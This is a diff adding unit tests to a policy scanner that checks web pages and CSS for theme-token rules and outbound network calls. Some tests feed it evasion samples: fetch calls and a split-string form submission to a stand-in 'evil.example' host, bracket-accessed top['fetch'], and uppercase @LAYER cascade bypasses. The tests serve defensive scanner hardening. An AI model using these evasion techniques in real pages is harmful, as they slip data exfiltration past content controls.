@@ -664,6 +664,18 @@ class PolicyGateTest(unittest.TestCase):
         r = self.with_tokens(css)
         self.assertEqual(r.returncode, 0, r.stdout)
 
+    def test_at_layer_check_is_case_insensitive(self) -> None:
+        """CSS at-rule keywords are case-insensitive; the check was not. A
+        plain @LAYER reopened the round-2 cascade bypass completely."""
+        for keyword in ("@LAYER", "@Layer", "@SCOPE"):
+            with self.subTest(keyword=keyword):
+                css = self.tokens() + (
+                    f"\n{keyword} overrides {{\n"
+                    '  :root[data-theme="dark"] { --mg-ink-faint: #7C8C94; }\n}\n')
+                r = self.with_tokens(css)
+                self.assertEqual(r.returncode, 1, r.stdout)
+                self.assertIn("THEME-SYNC", r.stdout)
+
     def test_at_layer_in_tokens_is_rejected(self) -> None:
         """@layer decides winners independently of source order — an unlayered
         rule beats a layered one wherever each sits. parse_css_tokens resolves
@@ -755,6 +767,63 @@ class PolicyGateTest(unittest.TestCase):
                       '  fetch("https://evil.example.com/x");\r\n</script>')
         self.assertEqual(r.returncode, 1, r.stdout)
         self.assertIn("evil.example.com", r.stdout)
+
+    def test_a_regex_literal_does_not_disable_the_scanner(self) -> None:
+        """The nastiest defect found in three rounds, because it needs no
+        adversarial intent at all. `const t = /a\\//;` — an ordinary regex
+        matching a trailing slash — used to read as a `//` comment opener, so
+        everything after it on that line was blanked and stopped being
+        checked. Any regex matching a slash or a URL path segment was a
+        landmine that quietly switched both halves of the rule off."""
+        r = self.page('<script>const t = /a\\//; const bad = "#8B9AA0";</script>')
+        self.assertEqual(r.returncode, 1, r.stdout)
+        self.assertIn("colour literal", r.stdout)
+
+        r = self.page('<script>const u = /path\\/seg/;</script>'
+                      '<script>fetch("https://evil.example.com/x");</script>')
+        self.assertEqual(r.returncode, 1, r.stdout)
+        self.assertIn("evil.example.com", r.stdout)
+
+    def test_ordinary_regexes_and_division_still_pass(self) -> None:
+        """The other direction. The regex heuristic is deliberately biased
+        toward NOT blanking when it cannot decide: an unblanked comment is at
+        worst a loud false positive, while an over-eager blank silently
+        switches the rules off — which is the failure that already happened."""
+        for label, body in (
+                ("regex matching a slash",
+                 '<script>const r = /a\\//; fetch("/v1/x");</script>'),
+                ("division",
+                 '<script>const mean = total / count; fetch("/v1/x");</script>'),
+                ("html closing tags",
+                 '<div><span>x</span></div><script>fetch("/v1/x");</script>'),
+                ("regex character class containing a slash",
+                 '<script>const r = /[/]/; fetch("/v1/x");</script>')):
+            with self.subTest(construct=label):
+                r = self.page(body)
+                self.assertEqual(r.returncode, 0, r.stdout)
+
+    def test_runtime_token_assignment_is_rejected(self) -> None:
+        """The "colour tokens live in exactly one file" guarantee is static.
+        Writing a --mg-* property at runtime steps around it with no literal
+        for the colour checks to see."""
+        r = self.page('<script>document.documentElement.style'
+                      '.setProperty("--mg-ink-faint", computed);</script>')
+        self.assertEqual(r.returncode, 1, r.stdout)
+        self.assertIn("UI-SELF-CONTAINED", r.stdout)
+
+    def test_form_action_and_submit_are_rejected(self) -> None:
+        r = self.page('<script>const f = document.createElement("form");'
+                      'f.action = "ht" + "tps://evil.example/x"; f.submit();</script>')
+        self.assertEqual(r.returncode, 1, r.stdout)
+        self.assertIn("UI-SELF-CONTAINED", r.stdout)
+
+    def test_bracket_access_on_a_browsing_context_is_rejected(self) -> None:
+        """top["fetch"](...) reached the same function with none of the literal
+        text any other pattern looks for."""
+        for global_name in ("top", "parent", "frames"):
+            with self.subTest(global_name=global_name):
+                r = self.page(f'<script>{global_name}["fetch"]("/x");</script>')
+                self.assertEqual(r.returncode, 1, r.stdout)
 
     def test_colour_literal_is_caught_despite_an_unrelated_line_comment(self) -> None:
         """Pins the // exclusion as line-scoped. Replacing the whole exclusion
